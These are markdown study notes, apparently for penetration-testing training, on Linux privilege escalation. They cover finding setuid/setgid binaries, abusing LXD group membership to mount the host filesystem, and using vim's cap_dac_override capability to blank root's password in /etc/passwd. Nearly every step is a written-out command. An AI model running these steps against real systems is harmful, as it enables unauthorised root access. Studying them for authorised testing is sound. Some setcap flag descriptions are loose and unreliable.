# Special Permissions
-----
- Set User ID upon Execution (setuid) can allow a user to execute a program with the permission of another user.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
- Set Group ID (setgid) is another special permission that allows us to run binaries as if we were part of the group that created them. Same manner of escalation as setuid
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
OR
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

-----
# SUDO RIGHT ABUSE
-----
- check `sudo -l` to see what command users can sudo execute without password.

# PRIVILEGED GROUPS
-----
### LXC / LXD
- LXD = Ubuntu's container manager.
- Upon installation, all users are added to the LXD group.
- Users in this group can escalate privileges by creating an LXD container, making it privileged and accessing the host file system at `/mnt/root`
- Confirm membership: `id`
- Unzip Alpine image: `unzip alpine.zip`
- Start the LXD initialization process. Choose default options for each prompts. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information
```bash
lxd init
```
- Import local image
```bash
lxc image import alpione.tar.gz alpine.tar.gz.root --alias alpine
```
- Start a privileged container with the `security.privileged` set to `true`
```bash
lxc init alpine r00t -c security.privileged=true
```
- Mount the host file system
```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
- Spawn a shell inside the container instance.
```bash
lxc start r00t
# start a shell 
lxc exec r00t /bin/bash
# To access the contents of the root directory on the host type
cd /mnt/root/root
```
-----
# CAPABILITIES
-----
- Capabilities allow specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
- We can use `setcap` command to set capabilities for specific executables.
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

# The cap_ne_bind_service capability is set for a binary -> the binary will be able to bind to network port.
```
- `cap_sys_admin` allows an executable to perform actions with administrative privileges

|**Capability**|**Desciption**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|

- Some options of `setcap` command

|**Capability Values**|**Desciption**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|

- Several Linux capabilities can be used to escalate a user's privileges to root

|**Capability**|**Desciption**|
|---|---|
|`CAP_SETUID`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`CAP_SETGID`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`CAP_SYS_ADMIN`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|


### Enumerate Capabiliites
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation
- Exploit capabilities
```bash
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
cap_dac_override: allow bypassing DAC permission and modyfying files regardless of permisions

- "=eip" specifies the capability settings for "cap_dac_override." The "=eip" indicates that the capability is enabled in all three categories: effective, inheritable, and permitted.
    

Overall, the output signifies that the Vim text editor binary at the specified path ("/usr/bin/vim.basic") has the "cap_dac_override" capability with full privileges (effective, inheritable, and permitted). This capability allows Vim to override file permissions and perform actions that would otherwise be restricted based on traditional file permissions.
```

- Use the `vim` binary to edit `/etc/passwd` file
```bash
vim /etc/passwd
Remove the x for root user
# change password to root: 
su
```
